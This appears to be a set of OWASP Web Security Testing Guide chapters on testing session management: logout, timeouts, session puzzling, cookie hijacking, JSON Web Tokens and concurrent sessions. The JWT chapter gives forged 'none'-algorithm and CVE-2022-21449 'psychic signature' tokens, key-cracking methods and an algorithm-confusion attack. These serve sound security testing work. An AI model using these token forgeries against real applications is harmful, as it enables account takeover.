{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality.md", "content": "# Testing for Logout Functionality\n\n|ID          |\n|------------|\n|WSTG-SESS-06|\n\n## Summary\n\nSession termination is an important part of the session lifecycle. Reducing to a minimum the lifetime of the session tokens decreases the likelihood of a successful session hijacking attack. This can be seen as a control against preventing other attacks like Cross Site Scripting and Cross Site Request Forgery. Such attacks have been known to rely on a user having an authenticated session present. Not having a secure session termination only increases the attack surface for any of these attacks.\n\nA secure session termination requires at least the following components:\n\n- Availability of user interface controls that allow the user to manually log out.\n- Session termination after a given amount of time without activity (session timeout).\n- Proper invalidation of server-side session state.\n\nThere are multiple issues which can prevent the effective termination of a session. For the ideal secure web application, a user should be able to terminate at any time through the user interface. Every page should contain a log out button on a place where it is directly visible. Unclear or ambiguous log out functions could cause the user not trusting such functionality.\n\nAnother common mistake in session termination is that the client-side session token is set to a new value while the server-side state remains active and can be reused by setting the session cookie back to the previous value. Sometimes only a confirmation message is shown to the user without performing any further action. This should be avoided.\n\nSome web application frameworks rely solely on the session cookie to identify the logged-on user. The user's ID is embedded in the (encrypted) cookie value. The application server does not do any tracking on the server-side of the session. When logging out, the session cookie is removed from the browser. However, since the application does not do any tracking, it does not know whether a session is logged out or not. So by reusing a session cookie it is possible to gain access to the authenticated session. A well-known example of this is the Forms Authentication functionality in ASP.NET.\n\nUsers of web browsers often don't mind that an application is still open and just close the browser or a tab. A web application should be aware of this behavior and terminate the session automatically on the server-side after a defined amount of time.\n\nThe usage of a single sign-on (SSO) system instead of an application-specific authentication scheme often causes the coexistence of multiple sessions which have to be terminated separately. For instance, the termination of the application-specific session does not terminate the session in the SSO system. Navigating back to the SSO portal offers the user the possibility to log back in to the application where the log out was performed just before. On the other side a log out function in a SSO system does not necessarily cause session termination in connected applications.\n\n## Test Objectives\n\n- Assess the logout UI.\n- Analyze the session timeout and if the session is properly killed after logout.\n\n## How to Test\n\n### Testing for Log Out User Interface\n\nVerify the appearance and visibility of the log out functionality in the user interface. For this purpose, view each page from the perspective of a user who has the intention to log out from the web application.\n\n> There are some properties which indicate a good log out user interface:\n>\n> - A log out button is present on all pages of the web application.\n> - The log out button should be identified quickly by a user who wants to log out from the web application.\n> - After loading a page the log out button should be visible without scrolling.\n> - Ideally the log out button is placed in an area of the page that is fixed in the view port of the browser and not affected by scrolling of the content.\n\n### Testing for Server-Side Session Termination\n\nFirst, store the values of cookies that are used to identify a session. Invoke the log out function and observe the behavior of the application, especially regarding session cookies. Try to navigate to a page that is only visible in an authenticated session, e.g. by usage of the back button of the browser. If a cached version of the page is displayed, use the reload button to refresh the page from the server. If the log out function causes session cookies to be set to a new value, restore the old value of the session cookies and reload a page from the authenticated area of the application. If these test don't show any vulnerabilities on a particular page, try at least some further pages of the application that are considered as security-critical, to ensure that session termination is recognized properly by these areas of the application.\n\n> No data that should be visible only by authenticated users should be visible on the examined pages while performing the tests. Ideally the application redirects to a public area or a log in form while accessing authenticated areas after termination of the session. It should be not necessary for the security of the application, but setting session cookies to new values after log out is generally considered as good practice.\n\n### Testing for Session Timeout\n\nTry to determine a session timeout by performing requests to a page in the authenticated area of the web application with increasing delays. If the log out behavior appears, the used delay matches approximately the session timeout value.\n\n> The same results as for server-side session termination testing described before are excepted by a log out caused by an inactivity timeout.\n>\n> The proper value for the session timeout depends on the purpose of the application and should be a balance of security and usability. In a banking applications it makes no sense to keep an inactive session more than 15 minutes. On the other side a short timeout in a wiki or forum could annoy users which are typing lengthy articles with unnecessary log in requests. There timeouts of an hour and more can be acceptable.\n\n### Testing for Session Termination in Single Sign-On Environments (Single Sign-Off)\n\nPerform a log out in the tested application. Verify if there is a central portal or application directory which allows the user to log back in to the application without authentication. Test if the application requests the user to authenticate, if the URL of an entry point to the application is requested. While logged in in the tested application, perform a log out in the SSO system. Then try to access an authenticated area of the tested application.\n\n> It is expected that the invocation of a log out function in a web application connected to a SSO system or in the SSO system itself causes global termination of all sessions. An authentication of the user should be required to gain access to the application after log out in the SSO system and connected application.\n\n## Tools\n\n- [Burp Suite - Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater)\n\n## References\n\n### Whitepapers\n\n- [Cookie replay attacks in ASP.NET when using forms authentication](https://www.vanstechelman.eu/content/cookie-replay-attacks-in-aspnet-when-using-forms-authentication)\n", "timestamp": "2025-10-24T11:39:49.899859"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout.md", "content": "# Testing Session Timeout\n\n|ID          |\n|------------|\n|WSTG-SESS-07|\n\n## Summary\n\nIn this phase testers check that the application automatically logs out a user when that user has been idle for a certain amount of time, ensuring that it is not possible to \"reuse\" the same session and that no sensitive data remains stored in the browser cache.\n\nAll applications should implement an idle or inactivity timeout for sessions. This timeout defines the amount of time a session will remain active in case there is no activity by the user, closing and invalidating the session upon the defined idle period since the last HTTP request received by the web application for a given session ID. The most appropriate timeout should be a balance between security (shorter timeout) and usability (longer timeout) and heavily depends on the sensitivity level of the data handled by the application. For example, a 60 minute log out time for a public forum can be acceptable, but such a long time would be too much in a home banking application (where a maximum timeout of 15 minutes is recommended). In any case, any application that does not enforce a timeout-based log out should be considered not secure, unless such behavior is required by a specific functional requirement.\n\nThe idle timeout limits the chances that an attacker has to guess and use a valid session ID from another user, and under certain circumstances could protect public computers from session reuse. However, if the attacker is able to hijack a given session, the idle timeout does not limit the attacker’s actions, as he can generate activity on the session periodically to keep the session active for longer periods of time.\n\nSession timeout management and expiration must be enforced server-side. If some data under the control of the client is used to enforce the session timeout, for example using cookie values or other client parameters to track time references (e.g. number of minutes since log in time), an attacker could manipulate these to extend the session duration. So the application has to track the inactivity time server-side and, after the timeout is expired, automatically invalidate the current user's session and delete every data stored on the client.\n\nBoth actions must be implemented carefully, in order to avoid introducing weaknesses that could be exploited by an attacker to gain unauthorized access if the user forgot to log out from the application. More specifically, as for the log out function, it is important to ensure that all session tokens (e.g. cookies) are properly destroyed or made unusable, and that proper controls are enforced server-side to prevent the reuse of session tokens. If such actions are not properly carried out, an attacker could replay these session tokens in order to \"resurrect\" the session of a legitimate user and impersonate him/her (this attack is usually known as 'cookie replay'). Of course, a mitigating factor is that the attacker needs to be able to access those tokens (which are stored on the victim's PC), but, in a variety of cases, this may not be impossible or particularly difficult.\n\nThe most common scenario for this kind of attack is a public computer that is used to access some private information (e.g., web mail, online bank account). If the user moves away from the computer without explicitly logging out and the session timeout is not implemented on the application, then an attacker could access to the same account by simply pressing the \"back\" button of the browser.\n\n## Test Objectives\n\n- Validate that a hard session timeout exists.\n\n## How to Test\n\n### Black-Box Testing\n\nThe same approach seen in the [Testing for logout functionality](06-Testing_for_Logout_Functionality.md) section can be applied when measuring the timeout log out.\nThe testing methodology is very similar. First, testers have to check whether a timeout exists, for instance, by logging in and waiting for the timeout log out to be triggered. As in the log out function, after the timeout has passed, all session tokens should be destroyed or be unusable.\n\nThen, if the timeout is configured, testers need to understand whether the timeout is enforced by the client or by the server (or both). If the session cookie is non-persistent (or, more in general, the session cookie does not store any data about the time), testers can assume that the timeout is enforced by the server. If the session cookie contains some time related data (e.g., log in time, or last access time, or expiration date for a persistent cookie), then it's possible that the client is involved in the timeout enforcing. In this case, testers could try to modify the cookie (if it's not cryptographically protected) and see what happens to the session. For instance, testers can set the cookie expiration date far in the future and see whether the session can be prolonged.\n\nAs a general rule, everything should be checked server-side and it should not be possible, by re-setting the session cookies to previous values, to access the application again.\n\n### Gray-Box Testing\n\nThe tester needs to check that:\n\n- The log out function effectively destroys all session token, or at least renders them unusable,\n- The server performs proper checks on the session state, disallowing an attacker to replay previously destroyed session identifiers\n- A timeout is enforced and it is properly enforced by the server. If the server uses an expiration time that is read from a session token that is sent by the client (but this is not advisable), then the token must be cryptographically protected from tampering.\n\nNote that the most important thing is for the application to invalidate the session on the server-side. Generally this means that the code must invoke the appropriate methods, e.g. `HttpSession.invalidate()` in Java and `Session.abandon()` in .NET. Clearing the cookies from the browser is advisable, but is not strictly necessary, since if the session is properly invalidated on the server, having the cookie in the browser will not help an attacker.\n\n## References\n\n### OWASP Resources\n\n- [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)\n", "timestamp": "2025-10-24T11:39:49.969273"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling.md", "content": "# Testing for Session Puzzling\n\n|ID          |\n|------------|\n|WSTG-SESS-08|\n\n## Summary\n\nSession Variable Overloading (also known as Session Puzzling) is an application level vulnerability which can enable an attacker to perform a variety of malicious actions, including but not limited to:\n\n- Bypass efficient authentication enforcement mechanisms, and impersonate legitimate users.\n- Elevate the privileges of a malicious user account, in an environment that would otherwise be considered foolproof.\n- Skip over qualifying phases in multi-phase processes, even if the process includes all the commonly recommended code level restrictions.\n- Manipulate server-side values in indirect methods that cannot be predicted or detected.\n- Execute traditional attacks in locations that were previously unreachable, or even considered secure.\n\nThis vulnerability occurs when an application uses the same session variable for more than one purpose. An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set in one context and then used in another.\n\nFor example, an attacker could use session variable overloading to bypass authentication enforcement mechanisms of applications that enforce authentication by validating the existence of session variables that contain identity–related values, which are usually stored in the session after a successful authentication process. This means an attacker first accesses a location in the application that sets session context and then accesses privileged locations that examine this context.\n\nFor example - an authentication bypass attack vector could be executed by accessing a publicly accessible entry point (e.g. a password recovery page) that populates the session with an identical session variable, based on fixed values or on user originating input.\n\n## Test Objectives\n\n- Identify all session variables.\n- Break the logical flow of session generation.\n\n## How to Test\n\n### Black-Box Testing\n\nThis vulnerability can be detected and exploited by enumerating all of the session variables used by the application and in which context they are valid. In particular this is possible by accessing a sequence of entry points and then examining exit points. In case of black-box testing this procedure is difficult and requires some luck since every different sequence could lead to a different result.\n\n#### Examples\n\nA very simple example could be the password reset functionality that, in the entry point, could request the user to provide some identifying information such as the username or the email address. This page might then populate the session with these identifying values, which are received directly from the client-side, or obtained from queries or calculations based on the received input. At this point there may be some pages in the application that show private data based on this session object. In this manner the attacker could bypass the authentication process.\n\n### Gray-Box Testing\n\nThe most effective way to detect these vulnerabilities is via a source code review.\n\n## Remediation\n\nSession variables should only be used for a single consistent purpose.\n\n## References\n\n- [Session Puzzles](https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/puzzlemall/Session%20Puzzles%20-%20Indirect%20Application%20Attack%20Vectors%20-%20May%202011%20-%20Whitepaper.pdf)\n- [Session Puzzling and Session Race Conditions](https://sectooladdict.blogspot.com/2011/09/session-puzzling-and-session-race.html)\n", "timestamp": "2025-10-24T11:39:50.135373"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking.md", "content": "# Testing for Session Hijacking\n\n|ID          |\n|------------|\n|WSTG-SESS-09|\n\n## Summary\n\nAn attacker who gets access to user session cookies can impersonate them by presenting such cookies. This attack is known as session hijacking. When considering network attackers, i.e., attackers who control the network used by the victim, session cookies can be unduly exposed to the attacker over HTTP. To prevent this, session cookies should be marked with the `Secure` attribute so that they are only communicated over HTTPS.\n\nNote that the `Secure` attribute should also be used when the web application is entirely deployed over HTTPS, otherwise the following cookie theft attack is possible. Assume that `example.com` is entirely deployed over HTTPS, but does not mark its session cookies as `Secure`. The following attack steps are possible:\n\n1. The victim sends a request to `https://another-site.com`.\n2. The attacker corrupts the corresponding response so that it triggers a request to `https://example.com`.\n3. The browser now tries to access `https://example.com`.\n4. Though the request fails, the session cookies are leaked in the clear over HTTP.\n\nAlternatively, session hijacking can be prevented by banning use of HTTP using [HSTS](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security). Note that there is a subtlety here related to cookie scoping. In particular, full HSTS adoption is required when session cookies are issued with the `Domain` attribute set.\n\nFull HSTS adoption is described in a paper called *Testing for Integrity Flaws in Web Sessions* by Stefano Calzavara, Alvise Rabitti, Alessio Ragazzo, and Michele Bugliesi. Full HSTS adoption occurs when a host activates HSTS for itself and all its sub-domains. Partial HSTS adoption is when a host activates HSTS just for itself.\n\nWith the `Domain` attribute set, session cookies can be shared across sub-domains. Use of HTTP with sub-domains should be avoided to prevent the disclosure of unencrypted cookies sent over HTTP. To exemplify this security flaw, assume that the site `example.com` activates HSTS without the `includeSubDomains` option. The site issues session cookies with the `Domain` attribute set to `example.com`. The following attack is possible:\n\n1. The victim sends a request to `https://another-site.com`.\n2. The attacker corrupts the corresponding response so that it triggers a request to `https://fake.example.com`.\n3. The browser now tries to access `https://fake.example.com`, which is permitted by the HSTS configuration.\n4. Since the request is sent to a sub-domain of `example.com` with the `Domain` attribute set, it includes the session cookies, which are leaked in the clear over HTTP.\n\nFull HSTS should be activated on the apex domain to prevent this attack.\n\n## Test Objectives\n\n- Identify vulnerable session cookies.\n- Hijack vulnerable cookies and assess the risk level.\n\n## How to Test\n\nThe testing strategy is targeted at network attackers, hence it only needs to be applied to sites without full HSTS adoption (sites with full HSTS adoption are secure, since their cookies are not communicated over HTTP). We assume to have two testing accounts on the site under test, one to act as the victim and one to act as the attacker. We simulate a scenario where the attacker steals all the cookies which are not protected against disclosure over HTTP, and presents them to the site to access the victim's account. If these cookies are enough to act on the victim's behalf, session hijacking is possible.\n\nHere are the steps for executing this test:\n\n1. Login to the site as the victim and reach any page offering a secure function requiring authentication.\n2. Delete from the cookie jar all the cookies which satisfy any of the following conditions.\n    - in case there is no HSTS adoption: the `Secure` attribute is set.\n    - in case there is partial HSTS adoption: the `Secure` attribute is set or the `Domain` attribute is not set.\n3. Save a snapshot of the cookie jar.\n4. Trigger the secure function identified at step 1.\n5. Observe whether the operation at step 4 has been performed successfully. If so, the attack was successful.\n6. Clear the cookie jar, login as the attacker and reach the page at step 1.\n7. Write in the cookie jar, one by one, the cookies saved at step 3.\n8. Trigger again the secure function identified at step 1.\n9. Clear the cookie jar and login again as the victim.\n10. Observe whether the operation at step 8 has been performed successfully in the victim's account. If so, the attack was successful; otherwise, the site is secure against session hijacking.\n\nWe recommend using two different machines or browsers for the victim and the attacker. This allows you to decrease the number of false positives if the web application does fingerprinting to verify access enabled from a given cookie. A shorter but less precise variant of the testing strategy only requires one testing account. It follows the same pattern, but it halts at step 5 (note that this makes step 3 useless).\n\n## Tools\n\n- [ZAP](https://www.zaproxy.org)\n- [JHijack - a numeric session hijacking tool](https://sourceforge.net/projects/jhijack/)\n", "timestamp": "2025-10-24T11:39:50.246637"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md", "content": "# Testing JSON Web Tokens\n\n|ID          |\n|------------|\n|WSTG-SESS-10|\n\n## Summary\n\nJSON Web Tokens (JWTs) are cryptographically signed JSON tokens, intended to share claims between systems. They are frequently used as authentication or session tokens, particularly on REST APIs.\n\nJWTs are a common source of vulnerabilities, both in how they are in implemented in applications, and in the underlying libraries. As they are used for authentication, a vulnerability can easily result in a complete compromise of the application.\n\n## Test Objectives\n\n- Determine whether the JWTs expose sensitive information.\n- Determine whether the JWTs can be tampered with or modified.\n\n## How to Test\n\n### Overview\n\nJWTs are made up of three components:\n\n- The header\n- The payload (or body)\n- The signature\n\nEach component is base64 encoded, and they are separated by periods (`.`). Note that the base64 encoding used in a JWT strips out the equals signs (`=`), so you may need to add these back in to decode the sections.\n\n### Analyse the Contents\n\n#### Header\n\nThe header defines the type of token (typically `JWT`), and the algorithm used for the signature. An example decoded header is shown below:\n\n```json\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n```\n\nThere are three main types of algorithms that are used to calculate the signatures:\n\n| Algorithm | Description |\n|-----------|-------------|\n| HSxxx | HMAC using a secret key and SHA-xxx. |\n| RSxxx and PSxxx | Public key signature using RSA. |\n| ESxxx | Public key signature using ECDSA. |\n\nThere are also a wide range of [other algorithms](https://www.iana.org/assignments/jose/jose.xhtml#web-signature-encryption-algorithms) which may be used for encrypted tokens (JWEs), although these are less common.\n\n#### Payload\n\nThe payload of the JWT contains the actual data. An example payload is shown below:\n\n```json\n{\n  \"username\": \"administrator\",\n  \"is_admin\": true,\n  \"iat\": 1516239022,\n  \"exp\": 1516242622\n}\n```\n\nThe payload is it not usually encrypted, so review it to determine whether there is any sensitive of potentially inappropriate data included within it.\n\nThis JWT includes the username and administrative status of the user, as well as two standard claims (`iat` and `exp`). These claims are defined in [RFC 5719](https://tools.ietf.org/html/rfc7519#section-4.1), a brief summary of them is given in the table below:\n\n| Claim | Full Name | Description |\n|-------|-----------|-------------|\n| `iss` | Issuer | The identity of the party who issued the token. |\n| `iat` | Issued At | The Unix timestamp of when the token was issued. |\n| `nbf` | Not Before | The Unix timestamp of earliest date that the token can be used. |\n| `exp` | Expires | The Unix timestamp of when the token expires. |\n\n#### Signature\n\nThe signature is calculated using the algorithm defined in the JWT header, and then base64 encoded and appended to the token. Modifying any part of the JWT should cause the signature to be invalid, and the token to be rejected by the server.\n\n### Review Usage\n\nAs well as being cryptographically secure itself, the JWT also needs to be stored and sent in a secure manner. This should include checks that:\n\n- It is always [sent over encrypted (HTTPS) connections](../09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md).\n- If it is stored in a cookie, then it should be [marked with appropriate attributes](../06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md).\n\nThe validity of the JWT should also be reviewed, based on the `iat`, `nbf` and `exp` claims, to determine that:\n\n- The JWT has a reasonable lifespan for the application.\n- Expired tokens are rejected by the application.\n\n### Signature Verification\n\nOne of the most serious vulnerabilities encountered with JWTs is when the application fails to validate that the signature is correct. This usually occurs when a developer uses a function such as the NodeJS `jwt.decode()` function, which simply decodes the body of the JWT, rather than `jwt.verify()`, which verifies the signature before decoding the JWT.\n\nThis can be easily tested for by modifying the body of the JWT without changing anything in the header or signature, submitting it in a request to see if the application accepts it.\n\n#### The None Algorithm\n\nAs well as the public key and HMAC-based algorithms, the JWT specification also defines a signature algorithm called `none`. As the name suggests, this means that there is no signature for the JWT, allowing it to be modified.\n\nThis can be tested by modifying the signature algorithm (`alg`) in the JWT header to `none`, as shown in the example below:\n\n```json\n{\n        \"alg\": \"none\",\n        \"typ\": \"JWT\"\n}\n```\n\nThe header and payload are then re-encoded with base64, and the signature is removed (leaving the trailing period). Using the header above, and the payload listed in the [payload](#payload) section, this would give the following JWT:\n\n```txt\neyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0K.eyJ1c2VybmFtZSI6ImFkbWluaW5pc3RyYXRvciIsImlzX2FkbWluIjp0cnVlLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjI0MjYyMn0.\n```\n\nSome implementations try and avoid this by explicitly blocking the use of the `none` algorithm. If this is done in a case-insensitive way, it may be possible to bypass by specifying an algorithm such as `NoNe`.\n\n#### ECDSA \"Psychic Signatures\"\n\nA vulnerability was identified in Java version 15 to 18 where they did not correctly validate ECDSA signatures in some circumstances ([CVE-2022-21449](https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/), known as \"psychic signatures\"). If one of these vulnerable versions is used to parse a JWT using the `ES256` algorithm, this can be used to completely bypass the signature verification by tampering the body and then replacing the signature with the following value:\n\n```txt\nMAYCAQACAQA\n```\n\nResulting in a JWT which looks something like this:\n\n```txt\neyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.MAYCAQACAQA\n```\n\n### Weak HMAC Keys\n\nIf the JWT is signed using a HMAC-based algorithm (such as HS256), the security of the signature is entirely reliant on the strength of the secret key used in the HMAC.\n\nIf the application is using off-the-shelf or open source software, the first step should be go investigate the code, and see whether there is default HMAC signing key that is used.\n\nIf there isn't a default, then it may be possible to crack guess or brute-force they key. The simplest way to do this is to use the [crackjwt.py](https://github.com/Sjord/jwtcrack) script, which simply requires the JWT and a dictionary file.\n\nA more powerful option is to convert the JWT into a format that can be used by [John the Ripper](https://github.com/openwall/john) using the [jwt2john.py](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py) script. John can then be used to carry out much more advanced attacks against the key.\n\nIf the JWT is large, it may exceed the maximum size supported by John. This can be worked around by increasing the value of the `SALT_LIMBS` variable in `/src/hmacSHA256_fmt_plug.c` (or the equivalent file for other HMAC formats) and recompiling John, as discussed in the following [GitHub issue](https://github.com/openwall/john/issues/1904).\n\nIf this key can be obtained, then it is possible to create and sign arbitrary JWTs, which usually results in a complete compromise of the application.\n\n### HMAC vs Public Key Confusion\n\nIf the application uses JWTs with public key based signatures, but does not check that the algorithm is correct, this can potentially exploit this in a signature type confusion attack. In order for this to be successful, the following conditions need to be met:\n\n1. The application must expect the JWT to be signed with a public key based algorithm (i.e, `RSxxx` or `ESxxx`).\n2. The application must not check which algorithm the JWT is actually using for the signature.\n3. The public key used to verify the JWT must be available to the attacker.\n\nIf all of these conditions are true, then an attacker can use the public key to sign the JWT using a HMAC based algorithm (such as `HS256`). For example, the [Node.js jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken) library uses the same function for both public key and HMAC based tokens, as shown in the example below:\n\n```javascript\n// Verify a JWT signed using RS256\njwt.verify(token, publicKey);\n\n// Verify a JWT signed using HS256\njwt.verify(token, secretKey);\n```\n\nThis means that if the JWT is signed using `publicKey` as a secret key for the `HS256` algorithm, the signature will be considered valid.\n\nIn order to exploit this issue, the public key must be obtained. The most common way this can happen is if the application re-uses the same key for both signing JWTs and as part of the TLS certificate. In this case, the key can be downloaded from the server using a command such as the following:\n\n```sh\nopenssl s_client -connect example.org:443 | openssl x509 -pubkey -noout\n```\n\nAlternatively, the key may be available from a public file on the site at a common location such as `/.well-known/jwks.json`.\n\nIn order to test this, modify the contents of the JWT, and then use the previously obtained public key to sign the JWT using the `HS256` algorithm. This is often difficult to perform when testing without access to the source code or implementation details, because the format of the key must be identical to the one used by the server, so issues such as empty space or CRLF encoding may result in the keys not matching.\n\n### Attacker Provided Public Key\n\nThe [JSON Web Signature (JWS) standard](https://tools.ietf.org/html/rfc7515) (which defines the header and signatures used by JWTs) allows the key used to sign the token to be embedded in the header. If the library used to validate the token supports this, and doesn't check the key against a list of approved keys, this allows an attacker to sign an JWT with an arbitrary key that they provide.\n\nThere are a variety of scripts that can be used to do this, such as [jwk-node-jose.py](https://github.com/zi0Black/POC-CVE-2018-0114) or [jwt_tool](https://github.com/ticarpi/jwt_tool).\n\n## Related Test Cases\n\n- [Testing for Sensitive Information Sent via Unencrypted Channels](../09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md).\n- [Testing for Cookie Attributes](../06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md).\n- [Testing Browser Storage](../11-Client-side_Testing/12-Testing_Browser_Storage.md).\n\n## Remediation\n\n- Use a secure and up to date library to handle JWTs.\n- Ensure that the signature is valid, and that it is using the expected algorithm.\n- Use a strong HMAC key or a unique private key to sign them.\n- Ensure that there is no sensitive information exposed in the payload.\n- Ensure that JWTs are securely stored and transmitted.\n- See the [OWASP JSON Web Tokens Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html).\n\n## Tools\n\n- [John the Ripper](https://github.com/openwall/john)\n- [jwt2john](https://github.com/Sjord/jwtcrack)\n- [jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)\n- [JSON Web Tokens Burp Extension](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6)\n- [ZAP JWT Add-on](https://github.com/SasanLabs/owasp-zap-jwt-addon)\n\n## References\n\n- [RFC 7515 JSON Web Signature (JWS)](https://tools.ietf.org/html/rfc7515)\n- [RFC 7519 JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)\n- [OWASP JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)\n", "timestamp": "2025-10-24T11:39:50.355841"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions.md", "content": "# Testing for Concurrent Sessions\n\n|ID          |\n|------------|\n|WSTG-SESS-11|\n\n## Summary\n\nConcurrent sessions are a common aspect of web applications that enable multiple simultaneous user interactions. This test case aims to evaluate the application's ability to handle multiple active sessions for a single user. This functionality is essential for effectively managing concurrent user sessions, particularly in sensitive areas such as admin panels containing Personally Identifiable Information (PII), personal user accounts, or APIs reliant on third-party services to enrich user-provided data. The primary objective is to ensure that concurrent sessions align with the application's security requirements.\n\nUnderstanding the security needs in an application is key to assessing whether enabling concurrent sessions corresponds with the intended features. Allowing concurrent sessions isn't inherently detrimental and is intentionally permitted in many applications. However, it is crucial to ensure that the application’s functionality is effectively aligned with its security measures concerning concurrent sessions. If concurrent sessions are intended, it is vital to ensure additional security controls, such as managing active sessions, terminating sessions, and potential new session notifications. Conversely, if concurrent sessions are not intended or planned within the application, it is crucial to validate existing checks for session management vulnerabilities.\n\nTo recognize that concurrent sessions are essential, you should consider the following factors:\n\n- Understanding the application's nature, particularly situations where users might require simultaneous access from different locations or devices.\n- Identifying critical operations, such as financial transactions that require secure access.\n- Handling sensitive data like Personally Identifiable Information (PII), indicating the necessity for secure interactions.\n- Distinguishing between a management panel and a standard user dashboard for normal user access.\n\n## Test Objectives\n\n- Evaluate the application's session management by assessing the handling of multiple active sessions for a single user account.\n\n## How to Test\n\n1. **Generate Valid Session:**\n   - Submit valid credentials (username and password) to create a session.\n   - Example HTTP Request:\n\n     ```http\n     POST /login HTTP/1.1\n     Host: www.example.com\n     Content-Length: 32\n\n     username=admin&password=admin123\n     ```\n\n   - Example Response:\n\n     ```http\n     HTTP/1.1 200 OK\n     Set-Cookie: SESSIONID=0add0d8eyYq3HIUy09hhus; Path=/; Secure\n     ```\n\n   - Store the generated authentication cookie. In some cases, the generated authentication cookie is replaced by tokens such as JSON Web Tokens (JWT).\n\n2. **Test for Generating Active Sessions:**\n   - Attempt to create multiple authentication cookies by submitting login requests (e.g., one hundred times).\n\n   Note: Utilizing private browsing mode or multi-account containers might be beneficial for conducting these tests, as they can provide separate environments for testing session management without interference from existing sessions or cookies stored in the browser.\n\n3. **Test for Validating Active Sessions:**\n   - Try accessing the application using the initial session token (e.g., `SESSIONID=0add0d8eyYq3HIUy09hhus`).\n   - If successful authentication occurs with the first generated token, consider it a potential issue indicating inadequate session management.\n\nAlso, there are additional test cases that extend the scope of the testing methodology to include scenarios involving multiple sessions originating from various IPs and locations. These test cases aid in identifying potential vulnerabilities or irregularities in session handling related to geographical or network-based factors:\n\n- Test Multiple sessions from the same IP.\n- Test Multiple sessions from different IPs.\n- Test Multiple sessions from locations that are unlikely or impossible to be visited by the same user in a short period of time (e.g., one session created in a specific country, followed by another session generated five minutes later from a different country).\n\n## Remediation\n\nThe application should monitor and limit the number of active sessions per user account. If the maximum allowed sessions are surpassed, the system must invalidate previous sessions to maintain security. Implementing additional solutions can further mitigate this vulnerability:\n\n   1. **User Notification:** Notify users after each successful login to raise awareness of active sessions.\n   2. **Session Management Page:** Create a dedicated page to display and allow termination of active sessions for enhanced user control.\n   3. **IP Address Tracking:** Track the IP addresses of users who log in to an account and flag any suspicious activity, such as multiple logins from different locations.\n   4. **IP Address Restrictions:** Allow users to specify trusted IP addresses or ranges from which they can access their accounts, enhancing security by restricting sessions to known and approved locations.\n\n## Recommended Tools\n\n### Intercepting Proxy Tools\n\n- [Zed Attack Proxy](https://www.zaproxy.org)\n- [Burp Suite Web Proxy](https://portswigger.net)\n", "timestamp": "2025-10-24T11:39:50.524458"}
